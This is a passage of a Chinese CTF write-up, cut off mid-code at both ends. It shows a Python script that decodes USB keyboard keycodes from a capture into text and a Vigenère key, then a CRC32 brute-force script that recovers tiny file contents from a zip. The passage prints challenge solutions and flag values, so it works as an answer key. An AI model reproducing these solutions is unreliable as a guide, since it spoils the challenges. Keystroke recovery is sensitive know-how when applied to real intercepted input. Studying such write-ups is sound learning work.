punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span>          <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span>          <span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span>          <span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span>          <span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span>          <span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span>          <span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"00"</span><span class="token punctuation">:</span>             <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token number">-1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301351589.png"></p><p>这里收集被<DEL>删除的英文字母，合起来为<strong>soezusb</strong>，即后面的维吉尼亚解密所需要的东西(就是卡在这一步了，惨。。。)。</p><p>然后还有前半段我们可以在remote()找到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301353797.png"></p><p>39明显可以看出来是大写锁定了，步骤跟上面差不多，将Value值提取出来，然后进行上面两个代码的运行得到前半段的flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301355517.png"></p><p>然后结合起来为  </p><blockquote><p><strong>AGGSZ{Kp_wn_YRV_SOV_JMFYFFJS!!!}</strong></p></blockquote><p>密钥</p><blockquote><p>soezusb</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301357482.png"></p><h3 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a>EZcrc</h3><p>打开是一个压缩包里面很多txt文件，为三字节爆破，先用crc工具将其提取出来</p><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><pre><code>python CRC32-Tools.py -3 flag.zip</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301712899.png"></p><p>发现其顺序不对，通过脚本使其顺序正常</p><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    content <span class="token operator">=</span> file<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> content<span class="token punctuation">]</span>sorted_data <span class="token operator">=</span> sorted<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> int<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> entry <span class="token keyword">in</span> sorted_data<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"{entry[0]}: {hex(entry[1])}"</span><span class="token punctuation">)</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301715173.png"></p><p>然后再通过一个代码使前面的txt去掉成为标准模式</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">extract_hex</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 使用正则表达式匹配每一行txt后面的十六进制数据</span>    hex_values <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d+\.txt:\s+(0x[0-9a-fA-F]+)'</span><span class="token punctuation">,</span> file_content<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将十六进制数据用逗号隔开，头尾套上方括号</span>    result_str <span class="token operator">=</span> <span class="token string">'['</span> <span class="token operator">+</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>hex_values<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">']'</span>    <span class="token keyword">return</span> result_str<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 用于测试的示例文本，你需要替换成你的实际文件路径</span>    file_path <span class="token operator">=</span> <span class="token string">"b.txt"</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>        example_text <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> extract_hex<span class="token punctuation">(</span>example_text<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>最后进行三字节爆破得到内容</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> zlibcrc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x80a37b94</span><span class="token punctuation">,</span><span class="token number">0x67ff2f5b</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x2bd745ce</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x8011b198</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xca923eba</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x671c3b57</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x2bd745ce</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x671c3b57</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xbae88946</span><span class="token punctuation">,</span><span class="token number">0x8d05071e</span><span class="token punctuation">,</span><span class="token number">0x44454e88</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x3556ac70</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xca923eba</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf1a75063</span><span class="token punctuation">,</span><span class="token number">0x8ad3bf47</span><span class="token punctuation">,</span><span class="token number">0xe71302b2</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0x3556ac70</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x385b0871</span><span class="token punctuation">,</span><span class="token number">0x44454e88</span><span class="token punctuation">,</span><span class="token number">0xe9c57755</span><span class="token punctuation">,</span><span class="token number">0x67ff2f5b</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x987a20e2</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x80a37b94</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x987a20e2</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xca923eba</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x3556ac70</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xca923eba</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf1a75063</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf1a75063</span><span class="token punctuation">,</span><span class="token number">0x67ff2f5b</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0x35a296cb</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0xbae88946</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x671c3b57</span><span class="token punctuation">,</span><span class="token number">0x961e78b1</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x987a20e2</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xbae88946</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x987a20e2</span><span class="token punctuation">,</span><span class="token number">0x44454e88</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x385b0871</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xacb845e7</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0x55de84d6</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xbae88946</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0x3556ac70</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x671c3b57</span><span class="token punctuation">,</span><span class="token number">0x44454e88</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf1a75063</span><span class="token punctuation">,</span><span class="token number">0x8ad3bf47</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf1a75063</span><span class="token punctuation">,</span><span class="token number">0x5133df38</span><span class="token punctuation">,</span><span class="token number">0x76ccfc6b</span><span class="token punctuation">,</span><span class="token number">0x961e78b1</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x8011b198</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x385b0871</span><span class="token punctuation">,</span><span class="token number">0xe9c57755</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x80a37b94</span><span class="token punctuation">,</span><span class="token number">0xbae88946</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0xe9c57755</span><span class="token punctuation">,</span><span class="token number">0x44454e88</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xacb845e7</span><span class="token punctuation">,</span><span class="token number">0x5133df38</span><span class="token punctuation">,</span><span class="token number">0x35a296cb</span><span class="token punctuation">,</span><span class="token number">0x8ad3bf47</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xf9cd093c</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xca923eba</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x385b0871</span><span class="token punctuation">,</span><span class="token number">0xffcef5e5</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0x80a37b94</span><span class="token punctuation">,</span><span class="token number">0xd2b184ff</span><span class="token punctuation">,</span><span class="token number">0xb462df74</span><span class="token punctuation">,</span><span class="token number">0x32973a9e</span><span class="token punctuation">,</span><span class="token number">0xb10371d</span><span class="token punctuation">,</span><span class="token number">0xe9c57755</span><span class="token punctuation">,</span><span class="token number">0xef809c83</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 遍历所有可能的3字节数据</span><span class="token keyword">for</span> target_crc <span class="token keyword">in</span> crc_list<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 构造3字节数据</span>                crc <span class="token operator">=</span> zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>  <span class="token comment" spellcheck="true"># 计算CRC32值</span>                <span class="token keyword">if</span> crc <span class="token 